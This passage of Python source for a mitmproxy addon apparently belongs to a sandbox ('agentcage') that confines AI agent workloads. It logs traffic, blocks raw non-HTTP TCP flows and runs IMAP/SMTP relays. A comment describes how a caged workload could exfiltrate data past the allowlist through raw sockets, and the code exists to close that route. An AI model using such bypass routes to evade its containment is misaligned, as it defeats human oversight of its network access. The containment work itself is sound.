                ):
                    cap_inbound_resp = self._capture_writer.snapshot_response(flow)
                    self._capture_writer.write_entry(
                        flow_id=flow.id,
                        direction=pending["direction"],
                        decision=pending["decision"],
                        host=pending["host"],
                        method=pending["method"],
                        path=pending["path"],
                        inspectors=[],
                        inbound_req=pending["inbound_req"],
                        inbound_resp=cap_inbound_resp,
                        outbound_req=pending["outbound_req"],
                        outbound_resp=cap_outbound_resp,
                    )
            except Exception as exc:  # pragma: no cover
                ctx.log.warn(
                    f"[agentcage] capture write_entry failed: {exc}"
                )
            return

        # Legacy headers-only capture (capture.enable_har: false). Same
        # flat ``request``/``response`` shape that shipped pre-PR — no
        # body bytes, just enough metadata for `cage audit`-style
        # consumers; ``cage har`` will produce `content.size=0` entries
        # against this file (documented in apple-container.md before
        # this PR; cage.yaml opt-in moves us to the rich path above).
        if self._capture_fh is None:
            return
        host = flow.request.pretty_host
        capture: dict = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "direction": "outbound",
            "decision": "allowed",
            "host": host,
            "method": flow.request.method,
            "url": flow.request.pretty_url,
            "request": {
                "method": flow.request.method,
                "url": flow.request.pretty_url,
                "headers": [
                    {"name": k, "value": v}
                    for k, v in flow.request.headers.items()
                ],
            },
            "response": {
                "status": flow.response.status_code,
                "statusText": flow.response.reason or "",
                "headers": [
                    {"name": k, "value": v}
                    for k, v in flow.response.headers.items()
                ],
            },
        }
        self._write(self._capture_fh, capture)

    # ── Non-HTTP TCP bypass guard ──────────────────────────
    #
    # Background: mitmproxy in transparent mode handles TCP/80 + TCP/443
    # via the iptables REDIRECT installed in supervisor.sh stage 80. For
    # bytes that look like HTTP, mitmproxy dispatches to ``HttpLayer``
    # and ``request``/``response`` above enforce policy. For everything
    # else — raw bytes after the TCP handshake, or TLS that does not
    # carry HTTP inside — mitmproxy's ``next_layer`` (with the default
    # ``rawtcp=True``) falls back to ``TCPLayer``, which BRIDGES bytes
    # between the cage and the original destination. NO request /
    # response / websocket hook fires for those flows, so the allowlist
    # and secret-injection policy never run. A cage workload that opens
    # a socket to (e.g.) ``1.1.1.1:443`` and writes raw bytes can
    # exfiltrate freely.
    #
    # We restore the L7 invariant by killing every TCP flow that
    # reaches this hook. ``HttpLayer``-handled flows never produce a
    # ``TCPFlow``, so this hook only fires for the bypass path. Killing
    # uses two belts: (1) ``flow.server_conn.error = ...`` (checked by
    # mitmproxy's ``open_connection`` after ``server_connect`` — the
    # upstream is never opened, no bytes leave the cage); (2)
    # ``flow.kill()`` (canonical killed state for the audit pipeline).
    #
    # Protocol relays (IMAP/SMTP) listen on cage-author-chosen loopback
    # ports inside this same mitmproxy process. The cage reaches them
    # via 127.0.0.1; those sockets are served by the relay's own
    # asyncio accept loop and never pass through mitmproxy's
    # transparent intercept (supervisor.sh's iptables REDIRECT only
    # rewrites tcp/80 and tcp/443, not loopback). So this hook firing
    # always means a non-HTTP cage egress on an intercepted port.

    @staticmethod
    def _tcp_flow_target(flow) -> str:
        """Best-effort dest descriptor for a non-HTTP TCP bypass.

        Picks the most-trustworthy identifier available: TLS SNI
        (``flow.client_conn.sni``) → ``flow.server_conn.peername`` →
        ``flow.server_conn.address`` (the SO_ORIGINAL_DST IP:port the
        iptables REDIRECT preserved). Returns a printable ``host`` or
        ``host:port`` string for audit logs. Never raises — defensive
        against MagicMock-typed attrs in tests.
        """
        sni = getattr(getattr(flow, "client_conn", None), "sni", None)
        if isinstance(sni, bytes):
            try:
                sni = sni.decode("idna")
            except UnicodeError:
                sni = sni.decode("utf-8", "replace")
        if isinstance(sni, str) and sni:
            return sni
        server = getattr(flow, "server_conn", None)
        for attr in ("peername", "address"):
            value = getattr(server, attr, None)
            if isinstance(value, tuple) and value:
                host = value[0]
                port = value[1] if len(value) > 1 else None
                if isinstance(host, str) and host:
                    return f"{host}:{port}" if port is not None else host
        return "<unknown>"

    def tcp_start(self, flow) -> None:
        """Block raw TCP / non-HTTP flows that bypass the L7 hooks.

        Mirrors the container backend's ``Agentcage.tcp_start`` so both
        backends fail closed on the same bypass shape. The audit entry
        shape matches existing apple-container audit lines
        (``source: "apple-container"``, ISO ``ts``, ``decision``,
        ``reason``) so ``agentcage cage audit`` shows the kill alongside
        HTTP blocks.
        """
        target = self._tcp_flow_target(flow)
        reason = (
            f"non-http TCP bypass: cage opened a raw TCP/TLS flow to "
            f"{target} that does not speak HTTP; the L7 allowlist and "
            f"secret-injection policy do not apply to raw byte streams"
        )
        # Belt 1: refuse the upstream connect. ``open_connection`` in
        # mitmproxy/proxy/server.py reads ``command.connection.error``
        # after the ``server_connect`` hook and aborts before opening a
        # socket; ``tcp_start`` fires BEFORE ``OpenConnection`` is
        # yielded by ``TCPLayer.start`` (with ``connection_strategy=
        # lazy``, which supervisor.sh sets), so setting it here wins
        # the race.
        server = getattr(flow, "server_conn", None)
        if server is not None:
            try:
                server.error = reason
            except Exception:
                pass
        # Belt 2: canonical killed state.
        try:
            if getattr(flow, "killable", True):
                flow.kill()
        except Exception:
            pass

        ctx.log.warn(
            f"[agentcage] BLOCK (tcp-bypass) raw TCP flow to {target}"
        )
        self._audit({
            "ts": datetime.now(timezone.utc).isoformat(),
            "kind": "tcp_bypass_blocked",
            "direction": "outbound",
            "decision": "blocked",
            "reason": reason,
            "host": target,
            "source": "apple-container",
        })

    # ── Protocol relays (IMAP, SMTP, ...) ──────────────────

    def _seed_relay_secrets_env(self, entry: dict) -> None:
        """Populate ``os.environ`` with the relay's credential env vars
        before constructing the relay class.

        The relay's ``_resolve_credential("env:VAR")`` (and the equivalent
        ``cmd:``/``systemd-creds:``/``podman:`` schemes — same code path)
        simply reads ``os.environ[VAR]`` at instantiation time. On
        apple-container the cleartext value lives in
        ``/home/acproxy/secrets/<VAR>`` (re-staged by supervisor stage 35
        from the host bind mount). We read each file once here and copy
        it into the addon process's env so the relay's resolver works
        with no patching.

        The cage workload (uid 1000) never sees these env vars: they
        are set on the mitmproxy process (uid 200) and are NOT among
        the ``-e`` flags ``AppleContainerBackend.start()`` passes to
        ``container run`` — those are filtered to only secret_injection
        env names. Defense-in-depth: even ``container inspect <cage>``
        won't show relay credentials in the env block.
        """
        auth = entry.get("auth") or {}
        for key in ("user_source", "password_source"):
            src = str(auth.get(key, "") or "")
            scheme, _, var = src.partition(":")
            if not var or scheme not in (
                "env", "cmd", "systemd-creds", "podman", "",
            ):
                continue
            if os.environ.get(var):
                continue  # already set by container -e (legacy path)
            secret_file = os.path.join(SECRETS_DIR, var)
            try:
                with open(secret_file) as f:
                    value = f.read()
            except OSError:
                continue
            if value:
                os.environ[var] = value

    def _start_relay(self, entry: dict) -> None:
        """Instantiate one relay and schedule its ``start()`` on the
        mitmproxy event loop. Surfaces failures to the audit log
        instead of crashing the proxy.

        The container backend's addon does the same dance in
        ``_start_protocol_relays`` — we mirror that pattern so cages
        get the same operator-visible diagnostics on either backend.
        """
        rname = entry.get("name", "?") if isinstance(entry, dict) else "?"
        # Late import: ``relays.smtp`` pulls in ``inspectors.base`` at
        # module load. Doing the import lazily keeps a config-less
        # apple-container cage from paying the cost (and keeps the
        # addon importable on the host for unit tests when the
        # ``relays`` package isn't on sys.path).
        try:
            from relays import get as _get_relay
            from relays._validate import validate_relay_entry
        except ImportError as exc:
            ctx.log.warn(
                f"[agentcage] protocol_relays: cannot import relays "
                f"package ({exc}); skipping {rname!r}"
            )
            self._audit({
                "kind": "relay_import_failed",
                "relay": rname,
                "error": str(exc),
                "source": "apple-container",
            })
            return

        try:
            validate_relay_entry(entry)
        except ValueError as exc:
            ctx.log.warn(
                f"[agentcage] protocol_relays: {rname!r} invalid: {exc}"
            )
            self._audit({
                "kind": "relay_config_invalid",
                "relay": rname,
                "error": str(exc),
                "source": "apple-container",
            })
            return

        rtype = entry["type"]
        try:
            cls = _get_relay(rtype)
        except KeyError as exc:
            ctx.log.warn(
                f"[agentcage] protocol_relays: unknown type {exc}"
            )
            self._audit({
                "kind": "relay_unknown_type",
                "relay": rname,
                "error": str(exc),
                "source": "apple-container",
            })
            return

        self._seed_relay_secrets_env(entry)

        try:
            relay = cls(
                entry,
                audit_log=self._audit,
                log_allowed=False,
                # Inspector chain wiring is the next parity item; for now
                # apple-container relays run with the per-protocol policy
                # (recipient/sender allowlist, size + rate caps) but no
                # body inspector chain. Tracked under issue #120.
                inspectors=None,
            )
        except Exception as exc:
            ctx.log.warn(
                f"[agentcage] protocol_relays: {rname!r} init failed: {exc}"
            )
            self._audit({
                "kind": "relay_init_failed",
                "relay": rname,
                "error": str(exc),
                "source": "apple-container",
            })
            return

        try:
            loop = asyncio.get_event_loop()
            task = loop.create_task(relay.start())
        except Exception as exc:
            ctx.log.warn(
                f"[agentcage] protocol_relays: {rname!r} schedule failed: "
                f"{exc}"
            )
            self._audit({
                "kind": "relay_start_failed",
                "relay": rname,
                "error": str(exc),
                "source": "apple-container",
            })
            return

        def _on_done(t: "asyncio.Task", name: str = rname) -> None:
            if t.cancelled():
                return
            exc = t.exception()
            if exc is None:
                return
            ctx.log.error(
                f"[agentcage] protocol_relays: {name!r} start failed: {exc}"
            )
            self._audit({
                "kind": "relay_start_failed",
                "relay": name,
                "error": str(exc),
                "source": "apple-container",
            })

        task.add_done_callback(_on_done)
        self._relays.append(relay)
        ctx.log.info(
            f"[agentcage] protocol_relays: scheduled {rname!r} ({rtype})"
        )

    def running(self) -> None:
        """mitmproxy lifecycle hook: called once the proxy is fully up.

        We start protocol_relays listeners here (not in ``__init__``)
        because relay TCP listeners need the asyncio loop that mitmproxy
        creates during its own startup. Same hook the container backend
        uses for the symmetric ``_start_protocol_relays`` call.
        """
        if not self._relay_entries:
            return
        for entry in self._relay_entries:
            if not isinstance(entry, dict):
                continue
            self._start_relay(entry)

    async def done(self) -> None:
        """mitmproxy lifecycle hook: graceful shutdown.

        ``SmtpRelay.stop()`` / ``ImapRelay.stop()`` cancel in-flight
        client sessions so long-lived IDLE / DATA streams get a clean
        protocol-level close (``* BYE`` for IMAP, ``421`` for SMTP)
        instead of a TCP reset. Without this hook the careful shutdown
        logic in each relay is bypassed when mitmproxy tears down.
        """
        relays = list(self._relays)
        if not relays:
            return
        await asyncio.gather(
            *[r.stop() for r in relays], return_exceptions=True
        )


addons = [AllowlistAddon()]
